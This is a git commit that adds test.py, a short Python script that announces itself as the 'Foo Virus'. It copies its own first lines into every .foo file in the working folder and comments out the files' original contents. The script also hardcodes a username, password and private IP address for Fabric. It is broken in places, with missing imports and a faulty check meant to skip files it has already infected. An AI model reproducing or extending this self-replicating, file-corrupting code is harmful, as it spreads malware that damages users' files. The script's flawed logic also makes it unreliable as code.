14f97917afa68341d2702c2245d36c68e2df9e1f
Anuj Bhushan <anujbhushan5@gmail.com>
2018-11-10 22:42:31 +0530

    Add files via upload

---
+++ test.py
@@ -0,0 +1,25 @@
+from fabric.api import run
+from fabric.api import sudo
+from fabric.api import env
+
+env.user = 'anuj'
+env.password = 'anuj'
+env.host = '192.168.188.130'
+
+
+print("\n Hello from Foo Virus....only .foo files will be damaged\n")
+
+IN = open(sys.argv[0] , 'r')
+virus = [line for (i,line) in enumerate (IN) if i<37]
+
+for item in glob.glob("*.foo"):
+	IN = open(item , 'r')
+	all_of_it = IN.readlines()
+	IN.close()
+	if any(line.find('foovirus') for line in  all_of_it): next
+	os.chmod(item , 0o777)
+	OUT = open(item , 'w')
+	OUT.writelines(virus)
+	all_of_it = ['#' + line for line in all_of_it]
+	OUT.writelines(all_of_it)
+	OUT.close()
